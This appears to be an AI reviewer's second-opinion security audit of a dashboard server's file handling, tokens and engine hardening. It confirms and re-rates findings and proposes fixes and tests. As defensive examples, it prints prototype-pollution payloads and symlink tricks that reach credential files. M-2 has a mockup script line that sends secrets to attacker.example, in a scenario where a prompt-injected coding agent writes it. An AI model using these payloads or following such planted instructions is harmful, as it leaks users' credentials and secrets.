# Second-opinion review D: dashboard server, file handling, engine hardening

Reviewer: Opus (second opinion on `audit-fable.md`). Read-only. Checked at `develop` @ `36cb66f1` (the audit was at `c57e6884`, so line numbers here are the current ones). Two scratch PoCs ran against a temp git repo under `os.tmpdir()`, never against the repo's `.forge/`, and were deleted afterwards (`scratchpad/f07.mts`, `scratchpad/proto.mts`).

---

## F-07 — `GET /api/jobs/:id/file|raw` follows symlinks out of the job dir, no token

**Verdict: CONFIRMED and wider than written. Two parts of the severity reasoning are off.**

The code (`lib/server.ts:343-364`):
```ts
const m = p.match(/^\/api\/jobs\/([A-Za-z0-9._-]+)(\/file|\/raw|\/transcript|\/transcript\/events)?$/);
if (!m[2]) return readGuard(req, res) ? undefined : json(res, jobDetail(...));   // detail: readGuard
...
const file = safeJoin(jobDir(root, id), rel);
if (!file || isPrivateJobFile(file)) return send(res, 404, ...);
if (m[2] === '/file' && IMAGE_TYPES[...]) return sendImage(res, jobDir(root, id), file);
if (!exists(file) || !TEXT_EXT.has(path.extname(file))) return send(res, 404, ...);
...
if (m[2] === '/raw') { ...; const raw = fs.readFileSync(file); ... }          // no size cap
const size = fs.statSync(file).size;
const text = size > MAX_FILE ? ... readTail(file, MAX_FILE) : readText(file);   // readTail: fs.openSync(file,'r')
```
`safeJoin` (`lib/server.ts:1635-1639`) is lexical only: `path.resolve(base, rel)` then `startsWith(base + sep)`. Nothing resolves symlinks. Compare `sendImage` (`:1606-1633`), which does `realpathSync` + containment + `O_NOFOLLOW|O_NONBLOCK` + `fstat`, and `openConfinedLog` (`lib/environment.ts:33-61`), which does the same and also checks that the confinement dir itself is not a symlink. `isPrivateJobFile` (`lib/known-secrets.ts:29-36`) does realpath the file, but only to compare its basename against the private names. So the authors knew about symlinks here and closed only the credential-file case.

What I checked:
- **The token**: none on `/file` or `/raw`. **`readGuard` is also missing.** That point is not in the audit. Only the bare detail route (`!m[2]`) calls it. My PoC sent `Sec-Fetch-Site: cross-site` and still got `200 TOP-SECRET` from `/file`, while `/api/jobs/x` with the same header returned `403 cross-site`.
- **Directory symlinks work too.** That is worse than the audit says. `jobs/<id>/h -> $HOME`, then `?path=h/.config/gh/hosts.yml`, returned the gh OAuth token (PoC: `200 oauth_token: gho_FAKE`). Every `.yml/.json/.md/.txt/.log` under the target dir can be read this way. `TEXT_EXT` restricts only the *request path's* extension.
- **`/raw`** served a symlinked `.html` under `RAW_CSP` (PoC: 200). It also has **no size cap**: `fs.readFileSync(file)` at `:359` reads a log of any size whole, for any `TEXT_EXT` file, not just `.html`.
- **DoS**: no `O_NONBLOCK` and no `fstat`. A FIFO planted as `notes.md` makes `readFileSync` block the whole event loop: the dashboard and the in-process daemon pool, permission prompts included. A symlink to `/dev/zero` (`statSync().size === 0`, so `readText` runs) reads forever until the process runs out of memory. `sendImage` has comments that guard against exactly this.
- **Traversal through the id**: not possible. The WHATWG URL parser collapses `..`, `%2e%2e` and `.%2E` segments before matching (verified), and `jobDir` re-checks `^[a-z0-9][a-z0-9._-]*$`.
- **Who can plant a link**: daemon sessions cannot. They have no `ln`, `Write` cannot create links, and nothing in `lib/` copies worktree content into a job dir (`cpSync` call sites checked). An interactive builder with full Bash can. That same builder can already `cat` the file and send it out with `curl`, so for a single-user machine the gain is the DoS, plus disclosure to *other local users* (F-12).

**Severity: Low** (auditor: Medium). An attacker who can plant a link can already read the target. The new exposure is cross-user on a shared host, and the FIFO or `/dev/zero` DoS of the dashboard and pool. It is still worth fixing now: the fix is small, the pattern already exists twice, and the docs ("Dashboard security") give the impression that every agent-written file is read through a confined descriptor.

| # | Fix | Effort | Verdict |
|---|---|---|---|
| 1 | (auditor) `sendImage`'s pattern for text: realpath, confine, `O_NOFOLLOW\|O_NONBLOCK`, `fstat` regular file, read through the fd | S | **KEEP, AMEND**: reuse `openConfinedLog(root, jobDir(root,id), file)` rather than a third copy. It also refuses a symlinked job dir. Read the tail from the fd with `readLogPage` or a fd-based `readTail`, and apply `MAX_FILE` to `/raw` too (413 or tail). |
| 2 | (auditor) require the `x-forge-token` header on `/file` and `/raw` | S | **DROP as written.** `/raw` is loaded by `<iframe src>` (`dashboard/src/components/Drawer.svelte:219`) and screenshots by URL (`dashboard/src/lib/screenshots.ts:13`); neither can send a header. A query-string token would be readable by the mockup's own script (`location.href`) inside the frame. Against local processes the token adds nothing either, because `GET /` hands it out (F-12). |
| 3 | (auditor) serve only names from `jobDetail`'s own walk (`withFileTypes`, lstat semantics) | M | **KEEP as defense in depth**, not instead of 1: it recomputes a walk of up to depth 3 per request. |
| 4 | (own) add `readGuard` to `/file` and `/raw`, like every other read route | S | Recommended: it closes cross-site triggering of the reads and is consistent with the detail route. |
| 5 | (own) refuse any symlink on the path: `lstat` each component from the job dir down, as `lib/retention.ts` does ("never followed through a symlink") | S | Also fine. Simpler than realpath, and it also refuses intra-job-dir links, which no writer creates. |

**Recommendation:** 1 (via `openConfinedLog`, with the `/raw` cap) + 4. No response shapes change (only status codes), so no `API_VERSION` bump. Update the "Dashboard security" paragraph to say that job files are read the confined way.

**Tests** (`test/server.test.ts`, beside the screenshot block at `:190-230`, which already builds `outside`, `outsideDir` and a FIFO):
- `/file` and `/raw` on `notes.md -> outside`, `h -> outsideDir` + `h/x.yml`, a FIFO `pipe.md`, and `/dev/zero` as `z.log`, all 404. The server still answers `/api/state` afterwards, so it did not hang.
- A symlinked `.forge/jobs/<id>` returns 404.
- `/raw` over `MAX_FILE` returns 413, or the tail, whichever is chosen.
- `Sec-Fetch-Site: cross-site` on `/file` and `/raw` returns 403.
- Keep `test/server-secrets.test.ts:120` (symlink to a private file) passing.

---

## F-12 — Most dashboard GETs readable by any local process; token served to anyone on loopback

**Verdict: CONFIRMED.** `page()` (`lib/server.ts:1717-1729`) does `html.replace('__FORGE_TOKEN__', token)` for any request with a loopback Host. `/` has no other check. `/api/state`, `/api/stats`, `/api/evals*`, `/api/requests`, `/api/roster`, `/api/project`, `/api/backlog`, `/api/config` and `/api/about` (`:280-297`) have neither token nor `readGuard`. `/api/events` and `/api/daemons/log` have `readGuard` only. `readGuard` only filters on browser-sent headers, which `curl` simply leaves out. Only `/api/doctor`, `/api/github/preview`, `/api/environments`, `/api/jobs/:id/environment`, the transcript routes and the bundle need the token. `docs/ARCHITECTURE.md` acknowledges this ("The dashboard serves its token to any local client").

**Severity: Low** (agree). It falls outside the stated single-user model. On a shared host it is the root of F-07's cross-user reach and of full POST authority: a local `curl` can forge `Origin`.

| # | Fix | Effort | Verdict |
|---|---|---|---|
| 1 | (auditor) token in a 0600 file under `.forge/runtime/`, fetched by the page with a `Sec-Fetch-Site` check | S–M | **DROP as written.** The page can only get the token *from the server over loopback*, so any local user can make the same request. `Sec-Fetch-Site` is a header any non-browser client can set to `same-origin`. |
| 2 | (auditor) Unix socket 0600 | L | **AMEND**: real isolation for CLI clients only. Browsers cannot reach a socket, so the page would still need a loopback proxy, which brings the same problem back. Not worth it. |
| 3 | (auditor) document "single-user machine" + `forge doctor` warns when other users have shells (`who`) | S | **KEEP the docs part.** `who` misses ssh-less users and service accounts. Better to warn when `forge dash` runs as a uid on a host with other interactive accounts, or simply document it. |
| 4 | (own) Jupyter-style login: `forge dash` opens `http://127.0.0.1:<port>/#k=<token>` (a fragment, so it is never sent or logged). The page POSTs it once to `/api/session`, which sets an `HttpOnly; SameSite=Strict; Path=/` cookie named per port. `page()` stops embedding the token. Every `/api` route, GETs included, requires the cookie or header. `<img>` and `<iframe>` work through the cookie. | M | Real fix for multi-user hosts. A new tab needs the printed URL again; reload keeps the cookie. |
| 5 | (own) peer-uid check per connection: map the client's ephemeral port to a uid (Linux `/proc/net/tcp*` inode→uid; macOS `lsof -i`), refuse other uids | M–L | Transparent to the UI, but platform-specific and slow per connection on macOS. Fallback only. |

**Recommendation:** 3 (docs) now. Do 4 if shared or CI hosts are in scope for 1.0, which the enterprise-readiness and 1.0 goals suggest they might be. No `API_VERSION` bump is needed for 4 unless the new session route is added to `dashboard/src/lib/types.ts` (it should be).

**Tests (for 4):** `GET /` HTML contains no token; `/api/state` without the cookie or header returns 401 or 403; the session exchange sets `HttpOnly` + `SameSite=Strict`; a wrong `k` is refused, and the compare is constant-time; the screenshot `<img>` path works with the cookie alone.

---

## F-15 — Atomic writes: predictable temp names, follow a planted symlink

**Verdict: PARTIALLY CORRECT.** `lib/util.ts:136-158`:
```ts
const tmp = `${file}.${process.pid}.${Date.now()}.tmp`;
fs.writeFileSync(tmp, JSON.stringify(data, null, 2) + '\n');   // writeJsonAtomic, writeTextAtomic: no flag
fs.renameSync(tmp, file);
```
`writeFileSync` without `wx` opens `O_CREAT|O_TRUNC` and follows a symlink at `tmp`. The content lands in the link's target, and `rename` then installs the link as `file`. Confirmed. **Error in the audit:** `writeJsonPrivate` (`:144-151`) does *not* use a random suffix. It uses the same predictable `${pid}.${Date.now()}` name and only adds `flag: 'wx'`. So the fix "a random suffix as `writeJsonPrivate` does" copies something that does not exist. `wx` alone (O_EXCL) already refuses a symlink at the final component, but predictable names then let a planter make writes fail with EEXIST: a DoS of state writes.

Exploiting it means predicting pid + millisecond, so it is a spray. The only attacker for whom this is new is a **sandboxed** agent: Claude Code's sandbox lets Bash write the cwd, which includes `.forge/jobs/<id>/`. An unsandboxed writer (the `forge dash` server, the daemon supervisor writing `runtime.json` / `job.json`) would then write through a link to a path outside the sandbox. Content control is weak (Forge's JSON or markdown).

**Severity: Low** (agree; Info on hosts without a sandbox).

| # | Fix | Effort | Verdict |
|---|---|---|---|
| 1 | (auditor) `wx` + random suffix "as `writeJsonPrivate` does" | S | **AMEND**: add a real random suffix (`crypto.randomBytes(6).toString('hex')`) to all three functions, `writeJsonPrivate` included, with `wx`. Fold them into one `writeAtomic(file, data, { mode })`. |
| 2 | (auditor) `O_NOFOLLOW\|O_CREAT\|O_EXCL` fd | S | **KEEP as equivalent.** `O_EXCL` with `O_CREAT` already refuses a final-component link; `O_NOFOLLOW` adds nothing there. Pick whichever reads better. |
| 3 | (own) on EEXIST, retry once with a fresh random name, then throw | S | Pairs with 1, so a stale or planted file never wedges a write. |
| 4 | (own) confine the parent: before writing job state, check that `realpath(.forge/jobs/<id>)` equals `realpath(root)/.forge/jobs/<id>`, as `openConfinedLog` does | M | A symlinked job dir otherwise moves *every* write, which 1–3 do not address. Do it in `updateJob` and `startBackground`. |

**Recommendation:** 1 + 3 now (one helper), 4 when touching `jobs.ts`. `bin/forge:55` (`${file}.${pid}.tmp` without `wx`) is fine: it lives in the 0700, ownership-checked cache dir.

**Tests:** a new `test/util.test.ts` (none exists today). With `mock.method(Date, 'now', () => 1)`, plant a symlink at the old predictable name and at the target. After `writeJsonAtomic` the outside file is untouched and `file` is a regular file. A planted file at the first random name is retried. `writeJsonPrivate` keeps mode 0600.

---

## F-16 — YAML `__proto__` keys; `deepMerge` prototype pollution

**Verdict: PARTIALLY CORRECT.** Both mechanisms are real. Every reachable path I traced is inert today, and one example in the audit is already refuted by code and a test.

Code: `lib/yaml.ts:117-141` `parseMap` does `const out = {}` … `out[key] = …`. The duplicate check uses `hasOwnProperty`, which `__proto__` passes. The flow map at `:213-221` does the same. `lib/util.ts:508-518` `deepMerge` uses `Object.entries(src)` and recurses whenever `target[k]` is an object, including the inherited `target.__proto__`.

Verified with `scratchpad/proto.mts`:
- This YAML input:
  ```yaml
  __proto__:
    polluted: yes
  tracker:
    __proto__:
      kind: evil
  ```
  gives own keys `['tracker']`, with `parsed.polluted === 'yes'` and `parsed.tracker.kind === 'evil'` read through the *object's own* prototype. `Object.prototype` is untouched. Flow `x: {__proto__: {p: 1}}` behaves the same way.
- `deepMerge(defaults(), parsed)` (`lib/config.ts:429`) drops it for every key that defaults define (`merged.tracker.kind === 'local'`). For a key whose default is absent or null, the poisoned object is assigned whole and its inherited values stay readable.
- `deepMerge({}, JSON.parse('{"__proto__":{"pwned":1}}'))` **pollutes the global `Object.prototype`** (`({}).pwned === 1`).

Reachability:
- The audit's `--field x=…` → `setPath` example is **refuted**. `lib/commands/job.ts:492,591` refuses `__proto__`, `constructor` and `prototype` segments before `coerce`, pinned by `test/cli.test.ts:642-646`. Eval overlays are guarded too (`test/eval-overlay.test.ts:60,280`), and config sinks have `PROTO_KEYS` (`lib/config-sinks.ts:43,248,259,263`, tests at `test/config-sinks.test.ts:60,203`).
- Global pollution via util `deepMerge` is reachable only from `forge init write`'s answers JSON (`lib/commands/init.ts:88-90`). That file is written by the orchestrator in an interactive session, and `init write` is refused under the daemon.
- Inherited reads that differ from the merged view: `lib/commands/dash.ts:54` `getPath(yaml.parse(config), 'daemon.auth')`. A `__proto__: {daemon: {auth: api-key}}` there counts as "explicit" and suppresses the prompt. `lib/member-panel.ts:73-83` and `lib/member-repos.ts:133` read `doc.review` / `doc.repos` by property, so an inherited panel or repos map is accepted. Both read files that are already trusted config (the main checkout's config, the member repo's main-branch config, `local.yml`). No validator that iterates `Object.keys` is paired with a consumer that reads by property in a way that would let a value skip validation.

**Severity: Info** (auditor: Low). This is a latent footgun with no reachable effect today. Fix it because it is cheap and the repo already has the convention.

| # | Fix | Effort | Verdict |
|---|---|---|---|
| 1 | (auditor) `Object.create(null)` parser outputs + `Object.hasOwn` in `deepMerge`, skip proto keys | S | **AMEND**: keep `{}` outputs. Null-prototype maps silently change `in` and `toString` behaviour for every config consumer and buy nothing once the keys are refused. Keep the `deepMerge` half: refuse or skip `PROTO_KEYS` and recurse only when `Object.hasOwn(target, k)`. |
| 2 | (auditor) refuse those keys in `parseMap` (and the flow map) with a `YamlError` and the line number | S | **KEEP**: fails closed and matches the config-sinks precedent. Also refuse quoted forms (`"__proto__":`), which go through `unquoteKey`. |
| 3 | (own) hoist one `PROTO_KEYS` into `lib/util.ts` (now duplicated in `config-sinks.ts:43` and `commands/job.ts:492`) and use it in `yaml.ts`, `deepMerge` and `setPath` | S | Removes the per-call-site guards' drift. |
| 4 | (own) `setPath`: refuse proto segments itself, so the guard in `commands/job.ts` is not the only one | S | Defense in depth for future callers. |

**Recommendation:** 2 + 3 (+ 4 comes almost for free). No shape change.

**Tests:**
- `test/yaml.test.ts`: block `__proto__:`, flow `{__proto__: 1}`, quoted `"__proto__":` and `constructor:` each throw `YamlError` with a line.
- A unit test that `deepMerge({}, JSON.parse('{"__proto__":{"x":1}}'))` leaves `({}).x` undefined.
- `loadConfig` on a config containing `__proto__` gives `config_invalid`.

---

## F-17 — Start-up cache honours `FORGE_CACHE_DIR`

**Verdict: CONFIRMED (the mechanism); the attack premise is weak.** `bin/forge:78`: `path.resolve(process.env.FORGE_CACHE_DIR || fileURLToPath(new URL('../.cache', import.meta.url)))`. Then `:82-86` checks that it is a real directory, owned by the current user, not group- or world-writable, in a parent owned by us or root that is either private or sticky. The load hook (`:32-39`) runs any `strip/<node>/<sha256(source)>.js` it finds, with no check of the cached content. A 0700 dir under `/tmp` (sticky) passes every check. `test/startup-cache.test.ts:89` ("a cached module is what runs") does exactly that with a `mkdtemp` under `os.tmpdir()`. `docs/CLI.md:140` and `docs/ARCHITECTURE.md:46` document the override.

The premise, though: to aim an *unsandboxed* start at the planted dir, the attacker must control that process's environment, for example by appending to `$CLAUDE_ENV_FILE` (which `hooks/plugin-path.ts` itself appends `export PATH=…` to). Anyone who can do that can set `NODE_OPTIONS=--import /tmp/x.mjs` or put a fake `forge`, `git` or `node` first on `PATH`. Either one runs code in every later command, Forge or not. `FORGE_CACHE_DIR` adds no capability beyond that. The V8 half is Node's own `NODE_COMPILE_CACHE`, which `docs/ARCHITECTURE.md` says wins anyway.

**Severity: Info** (auditor: Low / needs confirmation). Whether a sandboxed Bash can write `CLAUDE_ENV_FILE` is moot, because the same write gives `NODE_OPTIONS`.

| # | Fix | Effort | Verdict |
|---|---|---|---|
| 1 | (auditor) drop the override; tests use a temp plugin copy | S–M | **KEEP as acceptable.** It is the cleanest end state and fits AGENTS.md's rule that the cache stays beside the code it caches. Cost: the 6 startup-cache tests copy `bin/` + `lib/` into a temp root per test (a few MB; fine under `concurrency: 4`). |
| 2 | (auditor) store `sha256(stripped)` beside each entry, keyed by a per-install secret in the plugin dir | M | **DROP**: the same user can read the secret, and anyone who can write the cache can also write the hash beside it. It defends nothing the ownership checks don't. |
| 3 | (own) honour `FORGE_CACHE_DIR` only when its realpath is inside the plugin root. Tests use `<ROOT>/.cache/t-<random>`: the parent `.cache` is 0700 and ours, so the existing checks pass, and it is gitignored by the `*` `.gitignore`. | S | Keeps the tests cheap and removes "anywhere on disk". |
| 4 | (own) keep it; add one sentence to ARCHITECTURE.md "Start-up cache" saying that whoever controls a start's environment already controls `NODE_OPTIONS` and `PATH`, so the override is not a boundary | S | Honest and costs nothing. |

**Recommendation:** 3 (or 4 if nobody wants to touch `bin/forge`). Either way, update `docs/CLI.md:140`.

**Tests:** in `test/startup-cache.test.ts`, a `FORGE_CACHE_DIR` outside the plugin root with a planted entry prints the uncached output (invert `:89`). The existing "cached module is what runs" moves to `ROOT/.cache/t-<rand>`, cleaned up in `finally`.

---

## F-20 — Background dev logs and job dirs have no size ceiling

**Verdict: CONFIRMED** (the audit had it as "needs confirmation"). `lib/worktree.ts:1079-1087`:
```ts
const logFile = path.join(dir, 'logs', `${name}.log`);
const fd = fs.openSync(logFile, 'a');
const child = spawn(sh, ['-lc', cmd], { cwd: job.worktree!, ..., detached: true, stdio: ['ignore', fd, fd] });
child.unref(); fs.closeSync(fd);
```
The detached child writes straight into the fd for its whole life. No Forge process stays behind to rotate it, and the log is never truncated across restarts (`'a'`). By contrast, daemon session logs rotate (`lib/daemon.ts:98` `rotateBytes` 20 MiB, `:827` `retention.logMaxBytes`), and `lib/retention.ts` prunes finished jobs by age, not size. On the read side, `/file` keeps to a 2 MB tail and the env-log stream keeps to 64 KiB, but `/raw` reads the whole file (`lib/server.ts:359`; see F-07).

**Severity: Info/Low** (agree it is minor). It is self-inflicted disk fill by the repo's own dev server; the amplifier is the uncapped `/raw` read.

| # | Fix | Effort | Verdict |
|---|---|---|---|
| 1 | (auditor) rotate `dev.log` at N MB in `startBackground`'s writer | S | **AMEND**: there is no writer, because the child holds the fd. Two parts instead. (a) At start, if the existing log is over `retention.logMaxBytes`, rename it to `.log.1` before opening (S). (b) For a running server, `ftruncate` the log to 0 from the dashboard's environment poll or `forge run --status` when it passes the cap. Safe because the child's fd is `O_APPEND`, so its writes continue at the new end (S–M). |
| 2 | (auditor) `forge doctor` warns when `.forge/jobs` or the worktrees root pass a threshold | S | **KEEP.** |
| 3 | (own) cap `/raw` at `MAX_FILE` (413 or tail), like `/file` | S | Removes the server-side OOM amplifier. Shared with F-07's fix. |
| 4 | (own) pipe the child's output through a small detached Node relay (built-ins only) that rotates at the cap | M | Proper rotation. It adds a process per server, and `stopDevProven`'s pid proof must keep pointing at the server, not the relay. |

**Recommendation:** 1(a) + 3 now, using the existing `retention.logMaxBytes` key rather than a new one (no schema bump; `docs/CONFIG.md` gains a sentence). Add 1(b) if long-running dev servers fill disks in practice.

**Tests:** a background test that seeds a `logs/dev.log` over the cap and checks it is rotated to `dev.log.1` with a new `dev.log` after `startBackground`. `/raw` on a 3 MB `.log` returns the capped response.

---

## Missed by the auditor

### M-1 — `/api/backlog?refresh` lets any website make the dashboard run `gh` synchronously
- **Where:** `lib/server.ts:286-297`. No `readGuard` and no token. `?refresh` bypasses the 60 s cache and calls `tracker.list` → `lib/trackers/github.ts:190-199` → `gh(ctx, ['issue','list',…])` → `run()` = `spawnSync` with no timeout (`lib/util.ts:62-74`), plus the project GraphQL query when project status sync is on. A custom tracker adapter runs whatever it does.
- **Scenario:** a page the human visits loops `new Image().src = 'http://127.0.0.1:7400/api/backlog?refresh=' + n`. The Host header is `127.0.0.1:7400`, so the loopback check passes, and the no-cors GET needs no CORS. Each request blocks the server's event loop for the length of a `gh` call, which stalls the in-process daemon pool, its permission prompts and every SSE stream. It also spends the user's GitHub rate limit. The server already gates `/api/github/preview` (`:316`) and `/api/doctor` (`:305`) for exactly this reason ("It spawns gh and spends the login's GitHub rate limit, so it takes the token like a POST"). Backlog refresh was missed.
- **Severity:** Low (remote-triggerable availability and rate-limit drain; no data leaves).
- **Fixes:**
  - (a) `readGuard` on `/api/backlog` (S). This stops modern browsers, which send Fetch Metadata.
  - (b) Require the token for `?refresh` (the dashboard already sends it on other fetches) and ignore `refresh` without it (S).
  - (c) Run tracker `list` off the event loop (async `execFile` with a timeout) and coalesce concurrent refreshes onto one promise, as `/api/environments` does (M).
  - Recommended: a + b, then c.
- **Test:** `GET /api/backlog?refresh=1` with `Sec-Fetch-Site: cross-site` returns 403. Without the token it is served from cache, with no tracker call counted (stub tracker).

### M-2 — Mockup frames can still exfiltrate by navigating themselves; the "no network request" claim is too strong
- **Where:** `lib/server.ts:180-182`:
  ```ts
  // Mockups must be self-contained ... and the frame makes no network request, so an agent misled
  // into writing secrets into a mockup can't send them anywhere.
  const RAW_CSP = "sandbox allow-scripts; default-src 'none'; script-src 'unsafe-inline'; ...";
  ```
  The dashboard embeds it with `<iframe sandbox="allow-scripts" src=".../raw?path=...">` (`dashboard/src/components/Drawer.svelte:219`). `default-src 'none'` blocks fetch, XHR, images and fonts. No CSP directive in shipping browsers blocks a document from navigating *its own* browsing context (`navigate-to` never shipped). The sandbox flags (no `allow-top-navigation`, no `allow-popups`, no `allow-forms`) stop top navigation, popups and forms, but not self-navigation. The dashboard page itself is served with no CSP (`page()` sets none, and `dashboard/index.html` has no meta CSP), so no `frame-src` limits where the frame may go.
- **Scenario:** a daemon session has no network tool (default `daemon.allowedTools`, `lib/config.ts:203-218`: no WebFetch, no curl), and its PR text is secret-scanned. Misled by issue text, it reads `.env` (Read is allowed) and writes `mockup.html` containing `<script>location.href='https://attacker.example/?d='+encodeURIComponent(…)</script>`. When the human opens the job's Design tab, the frame navigates and the secret leaves in the URL. This is a channel that skips both the daemon's tool allowlist and the secret scan.
- **Confidence:** likely, from the HTML sandbox and CSP specs. Not run in a browser in this review. Verify with the Browser pane against a scratch `forge dash`.
- **Severity:** Low–Medium (the one egress a no-network daemon session gets; it needs a human to open the mockup).
- **Fixes:**
  - (a) Serve the dashboard page with `Content-Security-Policy: frame-src 'self'` (plus `frame-ancestors 'none'` on `/` and `/raw`). The embedder's `frame-src` governs every navigation of the nested frame, including ones it starts itself, so the frame cannot leave the origin (S; check the Vite dev build is unaffected).
  - (b) Run `redactKnown` plus the secret scanner over mockup HTML before serving `/raw`, and refuse on a hit (S–M).
  - (c) Drop `allow-scripts` from both the CSP sandbox and the iframe. Mockups become static, and interactive ones lose behaviour (S, UX cost).
  - Recommended: a, and correct the comment and the "Dashboard security" text.
- **Test:** `test/server.test.ts` asserts `/`'s CSP contains `frame-src 'self'` and `/raw` carries `frame-ancestors 'none'`. A browser check (not unit) that a mockup's `location.href = 'https://example.com'` is blocked.

### M-3 — `readBody` keeps buffering after the 64 KiB cap; POST token compares are not constant-time
- **Where:** `lib/server.ts:1659-1669`:
  ```ts
  req.on('data', (c) => { data += c; if (data.length > 64 * 1024) reject(new Error('body too large')); });
  ```
  After `reject`, the listener stays attached and `req` is neither paused nor destroyed. The whole body is appended to `data` while the 400 goes out. The limit also counts UTF-16 units of a string decoded chunk by chunk, so a multibyte character split across chunks decodes wrongly. Separately, `guardPost` and `guardToken` (`:1237-1249`) compare with `!==`, while the query-string routes use `tokenMatches` (`:1520-1525`, `timingSafeEqual`). The audit's "already solid" line says "constant-time token compare on query-string routes", which is accurate but incomplete.
- **Scenario:** any local process fetches the token from `GET /` (F-12), then POSTs a multi-GB body to `/api/requests`. The server answers 400 but keeps growing `data` until it runs out of memory, taking the daemon pool down with it. The timing difference of `!==` over loopback on a random token is not practically exploitable; it is a consistency fix.
- **Severity:** Low (DoS, local only); the compare is Info.
- **Fixes:**
  - (a) On overflow: `req.removeAllListeners('data'); req.resume()` or `req.destroy()`, and reject once (S).
  - (b) Collect `Buffer` chunks, count `byteLength`, and decode once at the end with `Buffer.concat(...).toString('utf8')`. This also fixes the split-character bug (S).
  - (c) Check `Content-Length` up front and answer 413 before reading. Use `tokenMatches` inside `guardPost` and `guardToken` (S).
  - Recommended: all three; they are one small function.
- **Test:** POST a 1 MiB body with a valid token returns 413/400, and the server's `data` never passes the cap (instrument via `onRequest`, or check heap does not grow over repeated 50 MiB posts). A UTF-8 body with a 4-byte character at the chunk boundary parses intact.

Also checked and found sound (not findings):
- `isLoopbackHost` (`:1397-1400`): exact match after stripping `:\d+`. `localhost.`, `127.0.0.1.nip.io` and `[::ffff:127.0.0.1]` are refused (by code reading; the PoC's Host probe hit a script bug and did not run).
- `server.listen(port, host)` binds loopback.
- `Origin: null` fails `sameOrigin`, because `new URL('null')` throws, so POSTs and `readGuard` refuse it.
- `{@html}` is limited to escape-first builders by `test/dashboard-invariants.test.ts:44-76`.
- `/api/events` has no token, so a local process can hold all 8 `MAX_SSE_CLIENTS` slots (shared with transcript and env-log streams) by reconnecting. This is the same class as F-12 and is documented for the cross-site case in "Daemon security".

---

## Notes for the synthesizer

| ID | Auditor severity | My severity | Verdict | Recommended fix |
|---|---|---|---|---|
| F-07 | Medium | Low | CONFIRMED, and wider (dir symlinks reach e.g. `~/.config/gh/hosts.yml`; no `readGuard` either; FIFO or `/dev/zero` hang; `/raw` uncapped). Header-token fix unworkable (iframe/img) | Read through `openConfinedLog` with the `MAX_FILE` cap on `/raw` too, and add `readGuard` to `/file` and `/raw` |
| F-12 | Low | Low | CONFIRMED; auditor's fix 1 (0600 file + Sec-Fetch-Site) gives no isolation | Document single-user now; later, fragment-token → HttpOnly SameSite cookie, page stops embedding the token |
| F-15 | Low | Low | PARTIALLY CORRECT: `writeJsonPrivate` has no random suffix either; real new attacker is a sandboxed agent | One `writeAtomic` helper: random suffix + `wx` + one retry; later confine the job dir's realpath |
| F-16 | Low | Info | PARTIALLY CORRECT: mechanisms real, all traced paths inert; `--field` example refuted (`commands/job.ts:591`, `test/cli.test.ts:642`) | `YamlError` on `__proto__`/`constructor`/`prototype` keys; shared `PROTO_KEYS` in `deepMerge` and `setPath` |
| F-17 | Low (needs conf.) | Info | CONFIRMED mechanism; premise moot (env control already gives `NODE_OPTIONS`/`PATH`) | Honour `FORGE_CACHE_DIR` only inside the plugin root (tests use `ROOT/.cache/t-*`), or document |
| F-20 | Low (needs conf.) | Info/Low | CONFIRMED: child holds the `'a'` fd, nothing rotates | Rotate at start past `retention.logMaxBytes`; cap `/raw`; doctor size warning |
| M-1 | — | Low | NEW: `/api/backlog?refresh` cross-site-triggerable sync `gh` spawn | `readGuard` + token for `refresh`; async `list` later |
| M-2 | — | Low–Med (likely) | NEW: mockup iframe can self-navigate to exfiltrate; RAW_CSP comment overclaims | `frame-src 'self'` CSP on the dashboard page, `frame-ancestors 'none'`; fix comment and docs |
| M-3 | — | Low | NEW: `readBody` keeps buffering past cap; `!==` token compare | Destroy or drain on overflow, byte counting, 413 on `Content-Length`; `tokenMatches` in guards |
